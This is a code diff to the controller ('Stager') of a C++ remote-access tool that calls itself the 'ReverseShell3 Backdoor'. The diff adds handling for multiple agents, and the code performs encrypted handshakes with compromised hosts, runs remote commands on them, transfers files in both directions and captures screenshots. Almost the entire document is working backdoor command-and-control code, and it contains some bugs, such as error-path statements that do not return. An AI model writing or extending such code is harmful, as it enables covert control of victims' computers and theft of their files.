@@ -1,67 +1,35 @@
 #include "Stager.h"
 
-bool Stager::Listen(PCSTR port, PCSTR ip)
+M_Result Stager::Listen(PCSTR port, PCSTR ip)
 {
 	connSocket = Socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 
-	if (not connSocket.Create())
+	if (connSocket.Create() == M_GenericError)
 	{
-		std::cerr << "Error at Create" << std::endl;
-		return false;
+		return M_GenericError;
 	}
 
-	std::cout << "[+] Server socket successfully created." << std::endl;
-
-	if (not connSocket.Bind(port, ip))
+	if (connSocket.Bind(port, ip) == M_GenericError)
 	{
-		std::cout << "Error at Bind" << std::endl;
 		connSocket.Close();
-		return false;
+		return M_GenericError;
 	}
 
-	std::cout << "[+] Server binded successfully" << std::endl;
+    if (not connSocket.SetBlocking(false) == M_GenericError)
+    {
+        return M_GenericError;
+    }
 
-	auto connAttempt = connSocket.Accept();
-
-	if (not connAttempt.has_value())
-	{
-		std::cout << "Error at Accept" << std::endl;
-		connSocket.Close();
-		return false;
-	}
-
-	auto [acceptedSocket, connIp, connPort] = connAttempt.value();
-
-	clientConn = Connection(acceptedSocket, connIp, connPort);
-	OnConnect(clientConn);
-
-
-	return true;
+	return M_Success;
 
 }
 
-bool Stager::ShutDown()
+void Stager::ShutDown()
 {
-
-	if (not connSocket.Close())
-	{
-		std::cerr << "Error at ShutDown" << std::endl;
-		return false;
-	}
-
-#pragma region temporary
-	if (not (clientConn.GetClientSocket() == INVALID_SOCKET))
-		if (not clientConn.Close())
-		{
-			std::cerr << "Error at ShutDown" << std::endl;
-			return false;
-		}
-#pragma endregion Code specific to close a single connected client
-
-	return true;
+    connSocket.Close();
 }
 
-bool Stager::OnConnect(Connection newConnection)
+M_Result Stager::OnConnect(Connection& newConnection)
 {
     Packet packet;
 
@@ -82,16 +50,15 @@ bool Stager::OnConnect(Connection newConnection)
     {
         std::string err = std::move(*(*out));
         std::cerr << err << std::endl;
-        return false;
+        M_GenericError;
     }
 
     serverHello = std::get<std::vector<BYTE>>(optServerHello);
 
     // receive clientHello
-    if (not newConnection.RecvPacket(packet))
+    if (newConnection.RecvPacket(packet) != M_Success)
     {
-        std::cerr << "Failed to receive clientHello packet. Error status: " << GetLastError() << std::endl;
-        return false;
+        return M_GenericError;
     }
     try
     {
@@ -101,17 +68,16 @@ bool Stager::OnConnect(Connection newConnection)
     catch (const PacketException& e)
     {
         std::cout << e.what() << std::endl;
-        return false;
+        return M_GenericError;
     }
     
     // send serverHello
     packet.Clear();
     packet << serverHello;
 
-    if (not newConnection.SendPacket(packet))
+    if (newConnection.SendPacket(packet) != M_Success)
     {
-        std::cerr << "Failed to send serverHello packet. Error status: " << GetLastError() << std::endl;
-        return false;
+        return M_GenericError;
     }
 
     seed.assign(clientHello.begin(), clientHello.end());
@@ -141,14 +107,13 @@ bool Stager::OnConnect(Connection newConnection)
     {
         std::string err = *(*out);
         std::cout << err << std::endl;
-        return false;
+        M_GenericError;
     }
 
     // receive the client pubBlob
-    if (not newConnection.RecvPacket(packet))
+    if (newConnection.RecvPacket(packet) != M_Success)
     {
-        std::cerr << "Failed to receive server pubBlob packet. Error status: " << GetLastError() << std::endl;
-        return false;
+        return M_GenericError;
     }
 
     // obtain the client pubBlob
@@ -160,7 +125,7 @@ bool Stager::OnConnect(Connection newConnection)
     catch (const PacketException& e)
     {
         std::cout << e.what() << std::endl;
-        return false;
+        return M_GenericError;
     }
 
     // send the server pubBlob
@@ -168,10 +133,9 @@ bool Stager::OnConnect(Connection newConnection)
     packet.Clear();
     packet << pubBlob;
 
-    if (not newConnection.SendPacket(packet))
+    if (newConnection.SendPacket(packet) != M_Success)
     {
-        std::cerr << "Failed to send pubBlob packet. Error status: " << GetLastError() << std::endl;
-        return false;
+        return M_GenericError;
     }
 
     // Generate secret agreement
@@ -180,7 +144,7 @@ bool Stager::OnConnect(Connection newConnection)
     {
         std::string err = *(*out);
         std::cout << err << std::endl;
-        return false;
+        return M_GenericError;
     }
 
     // 48 bytes shared secret
@@ -191,42 +155,136 @@ bool Stager::OnConnect(Connection newConnection)
 
     try
     {
-        clientConn.Crypt = Crypter(key);
+        newConnection.Crypt = Crypter(key);
 
-        if (not newConnection.RecvPacket(packet))
+        if (newConnection.RecvPacket(packet) != M_Success)
         {
-            std::cerr << "Failed to receive a packet. Error status: " << GetLastError() << std::endl;
-            return false;
+            return M_GenericError;
         }
 
-        clientConn.Crypt.DecryptPacket(packet);
+        newConnection.Crypt.DecryptPacket(packet);
 
         // recevie client current dir
-        std::cout << "[+] Accepted new connection: [ ip: " << newConnection.GetIp() << ", port: " << newConnection.GetPort() << "]" << std::endl;
+        std::cout << "[+] Accepted connection from Agent!" << std::to_string(newConnection.GetClientSocket()) << " [ip:" << newConnection.GetIp() << ", port : " << newConnection.GetPort() << "] " << std::endl << ">> ";
         std::cout << "[+] Current Directory: ";
-        std::cout << packet.ExtractString() << std::endl;
+        std::cout << packet.ExtractString() << std::endl << ">> ";
     }
 
     catch (const CrypterException& e)
     {
         std::cout << e.what() << std::endl;
-        return false;
+        return M_GenericError;
     }
 
     catch (const PacketException& e)
     {
         std::cout << e.what() << std::endl;
-        return false;
+        return M_GenericError;
     }
 
-    return true;
+    return M_Success;
 }
 
-
-bool Stager::Logic(const std::string& cmd)
+void Stager::ConnectionsManager()
 {
-    CommandStructure cmdStrc = CommandParser(cmd);
+    // initialize and push the WSAPOLLFD struct to the events vector
+    WSAPOLLFD listenSocketFD{};
+    listenSocketFD.fd = connSocket.GetSocketHandle();
+    listenSocketFD.events = POLLRDNORM;
+    listenSocketFD.revents = 0;
+
+    connectionsEvents.push_back(listenSocketFD);
+
+    while (true)
+    {
+        std::vector<WSAPOLLFD> c_connectionsEvents = connectionsEvents;
+
+        // check for socket events
+        if (WSAPoll(c_connectionsEvents.data(), c_connectionsEvents.size(), 4) > 0)
+        {
+            // check if there is a client that trying to connect
+            if (c_connectionsEvents[0].revents & POLLRDNORM)
+            {
+                // accept the connection
+                auto connAttempt = connSocket.Accept();
+                if (not connAttempt.has_value())
+                {
+                    std::cout << "Failed to accept a new connection" << std::endl;
+                }
+
+                
+                auto [acceptedSocket, connIp, connPort] = connAttempt.value();
+                Connection clientConn(acceptedSocket, connIp, connPort);
+
+                // preform encryption handshake and add a new Connection instance to the map
+                if (OnConnect(clientConn) == M_Success)
+                {
+                    WSAPOLLFD newConnectionEvents{};
+                    newConnectionEvents.fd = acceptedSocket;
+                    newConnectionEvents.events = POLLRDNORM | POLLWRNORM;
+                    newConnectionEvents.revents = 0;
+
+                    std::string connId = "Agent!" + std::to_string(acceptedSocket);
+                    connections.emplace(connId, clientConn);
+                    connectionsEvents.push_back(newConnectionEvents);
+                }
+
+                // print out err message if encryption is failed.
+                else
+                {
+                    std::cout << "[!] Failed to encrypt new connection. Closing connection.." << std::endl << ">> ";
+                    clientConn.Close();
+                }
+            }
+
+            for (size_t i = c_connectionsEvents.size() - 1; i > 0; i--)
+            {
+
+                if (c_connectionsEvents[i].revents & POLLHUP) //If poll hangup occurred on this socket
+                {
+                    connectionsEvents.erase(connectionsEvents.begin() + i);
+                    CloseConnection(c_connectionsEvents[i].fd, "The connection was either disconnected or aborted with");
+                    continue;
+                }
+
+                if (c_connectionsEvents[i].revents & POLLERR) //If error occurred on this socket
+                {
+                    connectionsEvents.erase(connectionsEvents.begin() + i);
+                    CloseConnection(c_connectionsEvents[i].fd, "The connection was closed due to an error with");
+                    continue;
+                }
+
+                if (c_connectionsEvents[i].revents & POLLNVAL) //If invalid socket
+                {
+                    connectionsEvents.erase(connectionsEvents.begin() + i);
+                    CloseConnection(c_connectionsEvents[i].fd, "The connection was closed due to an invalid socket with");
+                    continue;
+                }
+            }
+        }
+    }
+}
+
+void Stager::CloseConnection(SOCKET socketfd, const std::string& reason)
+{
+    // cleanup
+    std::string agentid = "Agent!" + std::to_string(socketfd);
+    connections[agentid].Close();
+    connections.erase(agentid);
+    currentConn = nullptr;
+    std::cout << "[!] " << reason << " " << agentid << std::endl << ">> ";
+}
+
+void Stager::Run()
+{
+    connectionsThread = std::thread(&Stager::ConnectionsManager, this);
+}
+
+M_Result Stager::Logic(const std::string& cmd)
+{
+    CommandStructure cmdStrc = InputParser(cmd);
     Packet packet(static_cast<PacketType>(cmdStrc.type));
+    M_Result result{};
 
     try
     {
@@ -238,12 +296,12 @@ bool Stager::Logic(const std::string& cmd)
         else if (cmdStrc.type == CommandType::agentdown)
         {
 
-            clientConn.Crypt.EncryptPacket(packet);
+            currentConn->Crypt.EncryptPacket(packet);
+            result = currentConn->SendPacket(packet);
 
-            if (not clientConn.SendPacket(packet))
+            if (result != M_Success)
             {
-                std::cerr << "Error at Send (ConnectionClose)." << std::endl;
-                return false;
+                return result;
             }
         }
 
@@ -259,29 +317,29 @@ bool Stager::Logic(const std::string& cmd)
                 // send a packet with the remotepath and filesize
                 uintmax_t filesize = std::filesystem::file_size(localpath);
                 packet << remotepath.string() << filesize;
-                clientConn.Crypt.EncryptPacket(packet);
+                currentConn->Crypt.EncryptPacket(packet);
 
-                if (not clientConn.SendPacket(packet))
+                result = currentConn->SendPacket(packet);
+                if (result != M_Success)
                 {
-                    std::cerr << "Error at Send." << std::endl;
-                    return false;
+                    return result;
                 }
 
                 // receive one packet to confirm the remote path validity
-                if (not clientConn.RecvPacket(packet))
+                result = currentConn->RecvPacket(packet);
+                if (result != M_Success)
                 {
-                    std::cerr << "Error at RecvPacket" << std::endl;
-                    return false;
+                    return result;
                 }
 
-                clientConn.Crypt.DecryptPacket(packet);
+                currentConn->Crypt.DecryptPacket(packet);
 
                 if (packet.GetPacketType() != PacketType::Invalid)
                 {
-                    if (not clientConn.SendFile(localpath.string(), filesize))
+                    result = currentConn->SendFile(localpath.string(), filesize);
+                    if (result != M_Success)
                     {
-                        std::cerr << "Error at SendFile (upload)" << std::endl;
-                        return false;
+                        return result;
                     }
                 }
 
@@ -305,28 +363,28 @@ bool Stager::Logic(const std::string& cmd)
             {
                 packet << cmdStrc.remote_path;
 
-                clientConn.Crypt.EncryptPacket(packet);
+                currentConn->Crypt.EncryptPacket(packet);
 
                 // send packet with the file name which we want to receive
-                if (not clientConn.SendPacket(packet))
+                result = currentConn->SendPacket(packet);
+                if (result != M_Success)
                 {
-                    std::cerr << "Error at Send (download pcket)." << std::endl;
-                    return false;
+                    return result;
                 }
 
                 // receive one packet and check if there is an error regrading the file specified path
-                if (not clientConn.RecvPacket(packet))
+                result = currentConn->RecvPacket(packet);
+                if (result != M_Success)
                 {
-                    std::cerr << "Error at Send (download pcket)." << std::endl;
-                    return false;
+                    return result;
                 }
 
-                clientConn.Crypt.DecryptPacket(packet);
+                currentConn->Crypt.DecryptPacket(packet);
 
                 if (packet.GetPacketType() == PacketType::Invalid)
                 {
                     std::cout << ">> [!] No such file or directory." << std::endl;
-                    return true;
+                    return M_GenericWarning;
                 }
 
                 uint32_t bytesToRead;
@@ -337,10 +395,10 @@ bool Stager::Logic(const std::string& cmd)
                 localpath /= remotepath.filename();
 
                 std::string path = localpath.string();
-                if (not clientConn.RecvFile(path, bytesToRead))
+                result = currentConn->RecvFile(path, bytesToRead);
+                if (result != M_Success)
                 {
-                    std::cerr << "Error at RecvFile" << std::endl;
-                    return false;
+                    return result;
                 }
             }
 
@@ -358,29 +416,29 @@ bool Stager::Logic(const std::string& cmd)
             if (::_mktemp_s(const_cast<char*>(filename.c_str()), filename.size() + 1) != 0)
             {
                 std::cerr << "Error at _mktemp_s." << std::endl;
-                return false;
+                return M_GenericError;
             }
 
             filename = filename + ".jpg";
 
-            //std::filesystem::path fullpath(cmdStrc.local_path);
-            //fullpath /= filename;
+            std::filesystem::path fullpath(cmdStrc.local_path);
+            fullpath /= filename;
 
-            clientConn.Crypt.EncryptPacket(packet);
+            currentConn->Crypt.EncryptPacket(packet);
 
-            if (not clientConn.SendPacket(packet))
+            result = currentConn->SendPacket(packet);
+            if (result != M_Success)
             {
-                std::cerr << "Error at SendPacket (screenshot)." << std::endl;
-                return false;
+                return result;
             }
 
-            if (not clientConn.RecvPacket(packet))
+            result = currentConn->RecvPacket(packet);
+            if (result != M_Success)
             {
-                std::cerr << "Error at RecvPacket (screenshot)." << std::endl;
-                return false;
+                return result;
             }
 
-            clientConn.Crypt.DecryptPacket(packet);
+            currentConn->Crypt.DecryptPacket(packet);
 
             std::string fileBuffer;
             packet >> fileBuffer;
@@ -391,7 +449,7 @@ bool Stager::Logic(const std::string& cmd)
             if (not file.is_open())
             {
                 std::cerr << "Error while trying to open the file." << std::endl;
-                return false;
+                return M_GenericError;
             }
 
             file.write(&fileBuffer[0], fileBuffer.size());
@@ -410,21 +468,21 @@ bool Stager::Logic(const std::string& cmd)
                 packet << cmdStrc.cmd;
             }
 
-            clientConn.Crypt.EncryptPacket(packet);
+            currentConn->Crypt.EncryptPacket(packet);
 
-            if (not clientConn.SendPacket(packet))
+            result = currentConn->SendPacket(packet);
+            if (result != M_Success)
             {
-                std::cerr << "Error at SendPacket (commandline)." << std::endl;
-                return false;
+                return result;
             }
 
-            if (not clientConn.RecvPacket(packet))
+            result = currentConn->RecvPacket(packet);
+            if (result != M_Success)
             {
-                std::cerr << "Error at RecvPacket (commandline)" << std::endl;
-                return false;
+                return result;
             }
 
-            clientConn.Crypt.DecryptPacket(packet);
+            currentConn->Crypt.DecryptPacket(packet);
 
             std::cout << packet.ExtractString() + "\n";
         }
@@ -433,20 +491,17 @@ bool Stager::Logic(const std::string& cmd)
     catch (const CrypterException& e)
     {
         std::cout << e.what() << std::endl;
-        return false;
+        return M_GenericError;
     }
 
     catch (const PacketException& e)
     {
         std::cout << e.what() << std::endl;
-        return false;
+        return M_GenericError;
     }
-
-    return true;
+    return M_Success;
 }
 
-
-// need to fix the help menu
 void Stager::PrintHelp()
 {
     std::cout << "[+] ReverseShell3 Backdoor" << std::endl;
@@ -476,7 +531,63 @@ void Stager::PrintHelp()
     std::cout << std::endl;
 }
 
-CommandStructure Stager::CommandParser(const std::string& input)
+void Stager::PrintAgents()
+{
+    if (not connections.empty())
+    {
+        std::cout << ">> " << std::left << std::setw(12) << "Agent" << std::left << std::setw(11) << "IP" << std::left << std::setw(11) << "Active" << std::endl;
+
+        for (auto& c : connections)
+        {
+            if (&c.second == currentConn)
+            {
+                std::cout << ">> " << std::left << std::setw(12) << c.first << std::left << std::setw(11) << c.second.GetIp() << std::left << std::setw(11) << "TRUE" << std::endl;
+            }
+
+            else
+            {
+                std::cout << ">> " << std::left << std::setw(12) << c.first << std::left << std::setw(11) << c.second.GetIp() << std::endl;
+            }
+        }
+            
+    }
+
+    else
+    {
+        std::cout << ">> [!] No available agents were found." << std::endl;
+    }
+
+}
+
+void Stager::SetCurrentAgent(const std::string& input)
+{
+    size_t agentStartIndex = input.find(" ");
+    std::string agent;
+
+    if (agentStartIndex != std::string::npos)
+    {
+        agent = input.substr(agentStartIndex + 1);
+    }
+
+    if (connections.find(agent) != connections.end())
+    {
+        currentConn = &connections[agent];
+
+        std::cout << ">> [+] " << agent << " is now active." << std::endl;
+    }
+
+    else
+    {
+        std::cout << ">> [!] Invalid agent or agent is not connected." << std::endl;
+    }
+}
+
+Connection* const Stager::GetCurrentAgent() const
+{
+    return currentConn;
+}
+
+CommandStructure Stager::InputParser(const std::string& input)
 {
     CommandStructure commandStrc;
     std::string_view command;
